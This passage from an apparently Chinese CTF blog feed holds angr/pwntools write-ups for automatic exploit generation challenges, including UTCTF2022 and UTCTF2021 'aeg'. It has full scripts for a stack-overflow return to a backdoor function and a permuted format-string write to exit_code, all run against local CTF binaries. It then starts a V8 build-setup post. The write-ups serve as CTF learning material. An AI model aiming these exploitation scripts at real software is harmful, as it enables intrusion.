class="hljs-keyword">return</span> rand_str[:<span class="hljs-number">4</span>]<br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;sha256(xxxx + &#x27;</span>)<br>salt = p.recvuntil(<span class="hljs-string">b&#x27;)&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>p.recvuntil(<span class="hljs-string">b&#x27; == &#x27;</span>)<br><span class="hljs-built_in">hash</span> = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">2</span>]<br>t = pass_proof(salt, <span class="hljs-built_in">hash</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;give me xxxx:&quot;</span>, t)<br>p.recvline()<br>bin_data = base64.b64decode(p.recvline().decode())<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(bin_data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_str</span>(<span class="hljs-params">state, addr</span>):<br>    s, i = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        ch = state.solver.<span class="hljs-built_in">eval</span>(state.memory.load(addr + i, <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> ch == <span class="hljs-number">0</span>: <br>            <span class="hljs-keyword">break</span><br>        s += <span class="hljs-built_in">chr</span>(ch)<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_global_val</span>(<span class="hljs-params">state, bvs, <span class="hljs-built_in">type</span></span>):<br>    name = <span class="hljs-string">&quot;s_&quot;</span> + <span class="hljs-built_in">str</span>(state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;count&#x27;</span>])<br>    state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;count&#x27;</span>] += <span class="hljs-number">1</span><br>    state.<span class="hljs-built_in">globals</span>[name] = (bvs, <span class="hljs-built_in">type</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_init</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>            <span class="hljs-keyword">return</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_input_line</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, buf_addr, size</span>):<br>            size = self.state.solver.<span class="hljs-built_in">eval</span>(size)<br>            buf_bvs = claripy.BVS(<span class="hljs-string">&quot;buf&quot;</span>, size * <span class="hljs-number">8</span>)<br>            save_global_val(self.state, buf_bvs, <span class="hljs-string">&quot;str&quot;</span>)<br>            self.state.memory.store(buf_addr, buf_bvs)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_input_val</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>            num_bvs = claripy.BVS(<span class="hljs-string">&quot;num&quot;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            save_global_val(self.state, num_bvs, <span class="hljs-string">&quot;int&quot;</span>)<br>            self.state.regs.rax = num_bvs<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_fksth</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, str1_addr, str2_addr</span>):<br>            str2 = load_str(self.state, str2_addr).encode()<br>            str1 = self.state.memory.load(str1_addr, <span class="hljs-built_in">len</span>(str2))<br>            self.state.regs.rax = claripy.If(str1 == str2, claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>))<br><br>binary_name = <span class="hljs-string">&quot;a&quot;</span><br>proj = angr.Project(binary_name)<br>proj.hook_symbol(<span class="hljs-string">&quot;_Z4initv&quot;</span>, replace_init())<br>proj.hook_symbol(<span class="hljs-string">&quot;_Z10input_linePcm&quot;</span>, replace_input_line())<br>proj.hook_symbol(<span class="hljs-string">&quot;_Z9input_valv&quot;</span>, replace_input_val())<br>proj.hook_symbol(<span class="hljs-string">&quot;_Z5fksthPKcS0_&quot;</span>, replace_fksth())<br>symbol = proj.loader.find_symbol(<span class="hljs-string">&quot;main&quot;</span>)<br>start_addr = symbol.rebased_addr<br>init_state = proj.factory.blank_state(addr = start_addr)<br>init_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;count&#x27;</span>] = <span class="hljs-number">0</span><br><br>find_addr = proj.loader.find_symbol(<span class="hljs-string">&#x27;_Z10input_linePcm&#x27;</span>).rebased_addr<br><br><span class="hljs-comment">#判断在input_line中是否发生溢出</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">success</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">if</span> state.addr == find_addr:<br>        reg_rbp = state.regs.rbp<br>        reg_rdi = state.regs.rdi<br>        reg_rsi = state.regs.rsi<br>        add_addr = reg_rdi + reg_rsi<br>        copied_state = state.copy()<br>        copied_state.add_constraints(reg_rbp &lt; add_addr)<br>        <span class="hljs-keyword">if</span> copied_state.satisfiable():<br>            state.add_constraints(reg_rbp &lt; add_addr)<br>            state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;overflow&#x27;</span>] = (state.solver.<span class="hljs-built_in">eval</span>(reg_rbp) - state.solver.<span class="hljs-built_in">eval</span>(reg_rdi), state.solver.<span class="hljs-built_in">eval</span>(reg_rsi))  <span class="hljs-comment">#保存溢出大小和输入大小</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr = proj.factory.simgr(init_state)<br><br>simgr.explore(find=success)<br><span class="hljs-keyword">if</span> simgr.found:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;find&quot;</span>)<br>    bindata = <span class="hljs-string">b&#x27;&#x27;</span><br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;count&#x27;</span>]):<br>        s, s_type = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;s_&#x27;</span> + <span class="hljs-built_in">str</span>(i)]<br>        <span class="hljs-keyword">if</span> s_type == <span class="hljs-string">&#x27;str&#x27;</span>:<br>            bb = solution_state.solver.<span class="hljs-built_in">eval</span>(s, cast_to=<span class="hljs-built_in">bytes</span>)<br>            bindata += bb<br>        <span class="hljs-keyword">elif</span> s_type == <span class="hljs-string">&#x27;int&#x27;</span>:<br>            bindata += <span class="hljs-built_in">str</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(s, cast_to=<span class="hljs-built_in">int</span>)).encode() + <span class="hljs-string">b&#x27; &#x27;</span><br><br>    elf = ELF(binary_name, checksec=<span class="hljs-literal">False</span>)<br>    context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>    ret = elf.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)).__next__()<br>    m, n = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;overflow&#x27;</span>]<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span> * m + p64(<span class="hljs-number">0</span>) + p64(ret) + p64(elf.sym[<span class="hljs-string">&#x27;_Z8backdoorv&#x27;</span>])<br>    bindata += payload.ljust(n, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    p.send(bindata)<br>    p.interactive()<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="UTCTF2022-aeg"><a href="#UTCTF2022-aeg" class="headerlink" title="UTCTF2022 aeg"></a>UTCTF2022 aeg</h3><p>题目存在格式化字符串，而得到flag的方式是控制exit的参数为指定值（国外的题和国内的就是不一样）。输入字符串后通过permute函数加密，再由printf去执行：</p><img src="/img/18/Screenshot 2023-09-22 152554.png" style="zoom:80%;" /><p>​                                                     </p><p>跟据前面做题的经验很快就可以写出如下通过约束的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_fgets</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, addr, size, stdin</span>):<br>            buf_bvs = claripy.BVS(<span class="hljs-string">&quot;buf&quot;</span>, <span class="hljs-number">513</span> * <span class="hljs-number">8</span>)<br>            self.state.memory.store(addr, buf_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buf&#x27;</span>] = buf_bvs<br><br>exit_num = <span class="hljs-number">92</span><br>binary_name = <span class="hljs-string">&quot;a&quot;</span><br>elf = ELF(<span class="hljs-string">&quot;a&quot;</span>, checksec=<span class="hljs-literal">False</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>proj = angr.Project(binary_name)<br>proj.hook_symbol(<span class="hljs-string">&quot;fgets&quot;</span>, replace_fgets())<br>start_addr = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>init_state = proj.factory.blank_state(addr = start_addr)<br>simgr = proj.factory.simgr(init_state)<br><br>exit_code_addr = elf.sym[<span class="hljs-string">&#x27;exit_code&#x27;</span>]<br>find_addr = start_addr + <span class="hljs-number">0x8c</span><br>payload = fmtstr_payload(<span class="hljs-number">8</span>, &#123;exit_code_addr:exit_num&#125;, write_size=<span class="hljs-string">&#x27;int&#x27;</span>)<br><br>simgr.explore(find=find_addr)<br><span class="hljs-keyword">if</span> simgr.found:<br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    buf_addr = solution_state.regs.rsp + <span class="hljs-number">0x10</span><br>    buf = solution_state.memory.load(buf_addr, <span class="hljs-built_in">len</span>(payload))<br>    solution_state.add_constraints(buf == payload)<br>    encodebuf = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buf&#x27;</span>], cast_to=<span class="hljs-built_in">bytes</span>)<br>    <span class="hljs-built_in">print</span>(encodebuf)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br></code></pre></td></tr></table></figure><p>但是这样直接去得到加密的字符串要花费将近两分钟，而这题限时60秒，这种方法是完全行不通的。</p><p>​                                          </p><p>看完官方的wp才发现，permute中的这些加密函数并不是真正的加密，它们只是将初始字符的位置进行交换：</p><img src="/img/18/Screenshot 2023-09-22 193231.png" style="zoom:80%;" /><p>​                                                   </p><p>这里简述一下官方wp的思路：</p><ul><li>使用的<code>state.inspect.b</code>实际上是类似设置的断点，在发生读写内存时都会触发该断点，并进一步执行回调函数，具体可以参考：<a href="https://docs.angr.io/en/latest/core-concepts/simulation.html#breakpoints">https://docs.angr.io/en/latest/core-concepts/simulation.html#breakpoints</a></li><li>每次读写内存都会触发回调函数，在回调函数中<code>if write_addr &lt; 0x1000</code>这个判断是为了得到字符的地址，而不是其它无关的地址。</li><li>permute1、permute2、permute3……这些函数中都是将原始字符串分段，然后改变这些段的顺序读取到栈上，最后再去覆写原始字符串的数据，由于每次读写都会保存的每个字符的地址，也就知道了字符的顺序是怎样改变的。</li><li>最后的<code>for i in range(len(reads)//FLAG_LEN)</code>就是通过上述特性去逐步获取permute1、permute2、permute3……这些函数中字符改变的顺序，将最终的字符顺序保存到<code>transformations</code>中。</li></ul><p>​                                               </p><p>其实我们只用关心初始字符串的顺序和最终字符串的顺序，字符串在permute1、permute2、permute3……这些函数中的变化是完全不用考虑的，最后改写代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aeg</span>(<span class="hljs-params">binary_name, exit_num</span>):<br>    elf = ELF(binary_name, checksec=<span class="hljs-literal">False</span>)<br>    context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>    proj = angr.Project(binary_name)<br>    start_addr = elf.sym[<span class="hljs-string">&#x27;permute&#x27;</span>]<br>    buf_addr = <span class="hljs-number">0x800000</span><br>    <span class="hljs-comment">#一定要配置这个add_options可选项，以便在符号执行中使用unicorn，不然也会巨慢无比</span><br>    init_state = proj.factory.call_state(<br>            start_addr,<br>            buf_addr,<br>            add_options=angr.options.unicorn.union(&#123;angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY&#125;)<br>    )<br><span class="hljs-comment">#这个初始化地址中的值其实是有一定问题的，因为单字节最大值只能是255，最后的顺序列表中会存在两个相同的值</span><br>    <span class="hljs-comment">#最后转换顺序时高地址的0x100个字符无法赋值，由于格式化的是低地址的字符，高地址的0x100个字符可以不用考虑</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):<br>        init_state.memory.store(buf_addr + i, i, <span class="hljs-number">1</span>)<br>    <br>    encode_num = []<br>    init_state.regs.rdi = buf_addr<br>    simgr = proj.factory.simgr(init_state)<br>    find_addr = start_addr + <span class="hljs-number">0x71</span><br>    simgr.explore(find = find_addr)<br>    state = simgr.found[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):<br>        encode_num.append(state.solver.<span class="hljs-built_in">eval</span>(state.memory.load(buf_addr + i, <span class="hljs-number">1</span>)))<br><br>    <span class="hljs-built_in">print</span>(encode_num)<br><br>aeg(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><p>这个直接几秒钟就可以得到最终的字符顺序表。</p><p>​                                                       </p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen, PIPE<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aeg</span>(<span class="hljs-params">binary_name, exit_num</span>):<br>    elf = ELF(binary_name, checksec=<span class="hljs-literal">False</span>)<br>    context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>    proj = angr.Project(binary_name)<br>    start_addr = elf.sym[<span class="hljs-string">&#x27;permute&#x27;</span>]<br>    buf_addr = <span class="hljs-number">0x800000</span><br>    init_state = proj.factory.call_state(<br>            start_addr,<br>            buf_addr,<br>            add_options=angr.options.unicorn.union(&#123;angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY&#125;)<br>    )<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):<br>        init_state.memory.store(buf_addr + i, i, <span class="hljs-number">1</span>)<br>    <br>    encode_num = []<br>    init_state.regs.rdi = buf_addr<br>    simgr = proj.factory.simgr(init_state)<br>    find_addr = start_addr + <span class="hljs-number">0x71</span><br>    simgr.explore(find = find_addr)<br>    state = simgr.found[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):<br>        encode_num.append(state.solver.<span class="hljs-built_in">eval</span>(state.memory.load(buf_addr + i, <span class="hljs-number">1</span>)))<br><br>    exit_code_addr = elf.sym[<span class="hljs-string">&#x27;exit_code&#x27;</span>]<br>    payload = fmtstr_payload(<span class="hljs-number">8</span>, &#123;exit_code_addr:exit_num&#125;, write_size=<span class="hljs-string">&#x27;int&#x27;</span>)<br>    payload = payload.ljust(<span class="hljs-number">256</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>    encoded_payload = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>):<br>        encoded_payload.append(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        encoded_payload[encode_num[i]] = payload[i]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        encoded_payload[<span class="hljs-number">0x100</span> + encode_num[i]] = payload[i]<br><br>    <span class="hljs-keyword">return</span> encoded_payload<br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>p.recvline()<br>p.recvline()<br>p.recvline()<br>p.recvline()<br>p.sendline()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solving&quot;</span>,i)<br>    x = p.recvuntil(<span class="hljs-string">b&quot;Binary&quot;</span>)[:-<span class="hljs-number">6</span>]<br>    exit_code_line = p.recvline()<br>    exit_code = <span class="hljs-built_in">int</span>(exit_code_line[exit_code_line.rindex(<span class="hljs-string">b&#x27; &#x27;</span>)+<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>])<br>    p.recvline()<br>    r = Popen([<span class="hljs-string">&#x27;xxd&#x27;</span>, <span class="hljs-string">&#x27;-r&#x27;</span>], stdout=PIPE, stdin=PIPE, stderr=STDOUT)<br>    binary = r.communicate(<span class="hljs-built_in">input</span>=x)[<span class="hljs-number">0</span>]<br>    binary_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;a.out&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>    binary_file.write(binary)<br>    binary_file.close()<br>    payload = aeg(<span class="hljs-string">&quot;a.out&quot;</span>,exit_code)<br>    p.sendline(payload)<br>    <span class="hljs-built_in">print</span>(p.recvline())<br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure><p>获得flag:</p><img src="/img/18/Screenshot 2023-09-22 214831.png" style="zoom: 67%;" /><p>​                                                              </p><h3 id="UTCTF2021-aeg"><a href="#UTCTF2021-aeg" class="headerlink" title="UTCTF2021 aeg"></a>UTCTF2021 aeg</h3><p>这道题网上只找到的两个二进制文件，没有完整的题目环境。</p><p>题目也很简单，栈溢出后控制到win函数执行exit函数，和上一题得到flag的条件一样。</p><p>通过约束的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_fgets</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, addr, size, stdin</span>):<br>            buf_bvs = claripy.BVS(<span class="hljs-string">&quot;buf&quot;</span>, <span class="hljs-number">63</span> * <span class="hljs-number">8</span>)<br>            self.state.memory.store(addr, buf_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buf&#x27;</span>] = buf_bvs<br><br>binary_name = <span class="hljs-string">&quot;0&quot;</span><br>proj = angr.Project(binary_name)<br>init_state = proj.factory.entry_state()<br>proj.hook_symbol(<span class="hljs-string">&quot;fgets&quot;</span>, replace_fgets())<br>simgr = proj.factory.simgr(init_state, save_unconstrained=<span class="hljs-literal">True</span>)<br>find_addr = proj.loader.find_symbol(<span class="hljs-string">&#x27;win&#x27;</span>).rebased_addr<br><br>d = simgr.explore()<br><span class="hljs-keyword">for</span> state <span class="hljs-keyword">in</span> d.unconstrained:<br>    state.add_constraints(state.regs.rip == find_addr)<br>    buf = state.solver.<span class="hljs-built_in">eval</span>(state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buf&#x27;</span>], cast_to=<span class="hljs-built_in">bytes</span>)<br>    <span class="hljs-built_in">print</span>(buf)<br>    p = process(<span class="hljs-string">&#x27;./0&#x27;</span>)<br>    gdb.attach(p)<br>    pause()<br>    p.send(buf)<br>    pause()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>V8学习</title>
    <link href="/2023/09/10/V8/"/>
    <url>/2023/09/10/V8/</url>
    
    <content type="html"><![CDATA[<h3 id="V8环境搭建"><a href="#V8环境搭建" class="headerlink" title="V8环境搭建"></a>V8环境搭建</h3><p>找个代理以后，直接参考这个师傅的文章：<a href="https://survive2.github.io/posts/1abc7753/">v8调试环境搭建</a>。但是自己本地的代理对于浏览器这种应用可以，不知道为什么终端就是不走代理（正好和参考文章的情况相反），这里我使用的是在终端中输入<code>export https_proxy=&quot;http://127.0.0.1:8889/</code>和<code>export http_proxy=&quot;http://127.0.0.1:8889/</code>这种暂时的的代理，剩下的就没什么区别了。</p><p>如果本地还是存在一些奇奇怪怪的问题，可以参考：<a href="https://zhuanlan.zhihu.com/p/159646912">工欲善其事：Github Action 极简搭建 v8 环境</a>，这篇文章使用GitHub Action去搭建V8，由于这个项目最后更新的是2020，有一些东西和现在已经不同了。之前在GitHub Action使用的是Ubuntu18，但现在Ubuntu18似乎已经被遗弃，改用Ubuntu20；之前使用的是牛奶快传这种工具，但是现在好像也没法去正常使用，最后改用文叔叔。</p><p>这里给出我魔改的版本：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">BUILD</span> <span class="hljs-string">v8</span><br><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span> [ <span class="hljs-string">master</span> ]<br>  <span class="hljs-comment"># watch:</span><br>  <span class="hljs-comment">#   types: started</span><br><br><span class="hljs-attr">env:</span><br>  <span class="hljs-attr">PATCH_FLAG:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">COMMIT:</span> <span class="hljs-string">568979f4d891bafec875fab20f608ff9392f4f29</span><br>  <span class="hljs-attr">DEPOT_UPLOAD:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">SRC_UPLOAD:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">BINARY_UPLOAD:</span> <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># A workflow run is made up of one or more jobs that can run sequentially or in parallel</span><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">build:</span><br>    <span class="hljs-comment"># The type of runner that the job will run on</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-20.04</span><br>    <span class="hljs-attr">if:</span> <span class="hljs-string">github.event.repository.owner.id</span> <span class="hljs-string">==</span> <span class="hljs-string">github.event.sender.id</span> <br>    <br>    <span class="hljs-attr">steps:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span><br>      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span><br>      <br>    <span class="hljs-comment"># init ubuntu2004 environment</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">init</span> <span class="hljs-string">env</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        sudo apt-get update</span><br><span class="hljs-string">        sudo apt-get -y install pkg-config git subversion curl wget build-essential python xz-utils zip p7zip-full ninja-build</span><br><span class="hljs-string"></span>    <br>    <span class="hljs-comment"># get depot_tools</span><br>    <span class="hljs-bullet">-</span> 